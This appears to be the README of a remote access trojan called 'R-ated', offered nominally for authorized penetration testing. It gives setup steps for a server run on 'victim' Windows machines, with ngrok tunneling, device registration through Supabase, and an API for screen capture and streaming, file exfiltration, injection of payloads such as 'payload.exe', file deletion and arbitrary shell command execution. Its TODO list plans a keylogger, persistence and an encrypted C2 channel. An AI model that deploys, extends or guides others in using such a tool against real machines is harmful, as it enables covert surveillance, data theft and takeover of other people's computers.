# R-ated

A multi-device remote access tool for authorized penetration testing.
Features device selection via Supabase Realtime, WebRTC screen streaming,
ngrok tunneling, file exfiltration, and remote command execution.

---

## ARCHITECTURE

Browser Client ─── HTTP / WebRTC ───▶ FastAPI Server (Port 6969, Windows)
│
┌─────┴──────┐
│ ngrok │
│ Tunnel │
└─────┬──────┘
│
┌─────┴──────┐
│ Supabase │
│ - Storage │
│ - Realtime │
└────────────┘

The client is a static HTML page. The server runs on each target Windows
machine. ngrok provides the public HTTPS URL. Supabase handles device
registration (realtime table) and file storage (exfil/inject).

---

## FEATURES

1. Multi-Device Selection
   - Targets register themselves in a Supabase table with their ngrok URL
   - Client subscribes to INSERT / DELETE / UPDATE via Supabase Realtime
   - Devices appear and disappear live — no polling
   - Click a device to select, then connect

2. Screenshot (mss)
   - One-shot screen capture returned as JPEG
   - Fast, no dependencies on GUI frameworks

3. Screen Streaming (WebRTC)
   - Real-time desktop streaming via WebRTC (aiortc + av)
   - Server captures frames with mss and streams via VideoStreamTrack
   - Client uses native RTCPeerConnection with a <video> element
   - Low latency, no plugins required

4. System Information (psutil)
   - Hostname, OS version, architecture
   - CPU cores (physical/logical), usage percentage
   - RAM total/available/usage
   - Disk C:\ total/free/usage
   - Username, local IP, boot time

5. File Operations
   - Directory listing
   - Read file (text)
   - Create / overwrite file
   - Delete file
   - Delete folder (recursive)

6. File Exfiltration (Supabase Storage)
   - Upload a file from the target to Supabase, returns a public URL

7. File Injection (Supabase Storage)
   - Download a file from Supabase and write it onto the target

8. Remote Command Execution
   - Run any shell command via subprocess
   - Returns stdout, stderr, exit code
   - Configurable working directory relative to C:\

---

## TECH STACK

| Component          | Tech used                                     |
| ------------------ | --------------------------------------------- |
| Server Framework   | FastAPI (Python)                              |
| Server Runtime     | Uvicorn                                       |
| Screen Capture     | mss                                           |
| Screen Streaming   | aiortc + av + OpenCV (cv2) + numpy            |
| System Info        | psutil, platform, socket                      |
| File I/O           | os, shutil, pathlib                           |
| Command Execution  | subprocess                                    |
| Tunneling          | ngrok (pyngrok)                               |
| Database / Storage | Supabase (PostgreSQL + S3-compatible storage) |
| Realtime           | Supabase Realtime (WebSocket)                 |
| Client             | Vanilla HTML + CSS + JavaScript               |
| WebRTC Client      | Browser native RTCPeerConnection              |
| Supabase Client    | @supabase/supabase-js (CDN)                   |

---

___

## SETUP
### SUPABASE

1. Create a project at ```https://supabase.com```

2. Go to Storage → Create a new public bucket named "rat"
   - Create a folder inside it called "public"

3. Go to SQL Editor and run:
```js
CREATE TABLE connected (
	ngrok_url TEXT PRIMARY KEY,
	os_name TEXT DEFAULT 'windows',
	name TEXT DEFAULT 'unknown',
	created_at TIMESTAMPTZ DEFAULT NOW()
);
ALTER TABLE connected ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow all" ON connected FOR ALL USING (true) WITH CHECK (true);
```


4. Go to Project Settings → API and copy:
   - Project URL
   - anon / public key (for the client)
   - service_role key (for the server)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### VICTIM MACHINE (SERVER)

1. Install Python dependencies:

pip install fastapi uvicorn mss pyngrok psutil python-dotenv supabase aiortc av opencv-python numpy

2. Create a .env file in the same directory as main.py:
```bash
SUPABASE_URL=https://your-project.supabase.co
SUPABASE_KEY=your-service-role-key
NGROK_AUTH_TOKEN=your-ngrok-auth-token
```
3. Run the server:
```bash
python main.py
```
The server will:

- Start FastAPI on port 6969
- Launch an ngrok tunnel automatically
- Register itself in the Supabase "connected" table
- Clean up the database entry on shutdown

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### CLIENT (CONTROL MACHINE)

1. Create a file named env.js (this file is in .gitignore):
```js
const supabase_auth = {
	"KEY": "your-supabase-anon-public-key",
	"URL": "https://your-project.supabase.co"
};
```
2. Serve the client directory with any HTTP server:
```bash
python -m http.server 8000
```
3. Open ```http://localhost:8000``` in a browser.

4. The device selection screen will populate with connected targets
   automatically via Supabase Realtime.

5. Click a device and press "connect to selected".

___

## API REFERENCE

- GET /  
Health check. Returns "Target Connected".

- GET /screenshot  
Capture screen via mss. Returns JPEG image.

- GET /info  
System information. Returns JSON (hostname, OS, CPU, RAM, disk, etc.).

- GET /getdir?path=Users\user\Desktop  
List directory under C:\. Returns JSON array of filenames.

- GET /readfile?path=Users\user\notes.txt  
Read a text file. Returns raw text.

- GET /createfile?path=test.txt&content=hello  
Create or overwrite a file. Returns byte count.

- GET /removefile?path=bad.txt  
Delete a file. Returns confirmation.

- GET /removefolder?path=secret  
Recursively delete a folder. Returns confirmation.

- GET /downloadfile?path=secret.docx  
Upload file to Supabase storage. Returns public URL.

- GET /uploadfile?dwpath=Desktop\&dbfilename=payload.exe  
Download file from Supabase and write to target. Returns confirmation.

- GET /cmd?cmd=whoami&path=Users\victim  
Execute shell command. Returns {stdout, stderr, code}.

- POST /offer  
WebRTC offer/answer for screen streaming. Accepts SDP JSON,
returns answer SDP.

## LEGAL

For authorized security testing and educational purposes only.
Unauthorized access to computer systems is illegal. You must have
explicit written permission from the system owner.

# TODO

- [ ] HTTPS between target and ngrok
- [ ] Streaming file transfers (no RAM ceiling)
- [ ] Keylogger module
- [ ] Persistence mechanisms (registry / scheduled task)
- [ ] Encrypted C2 channel
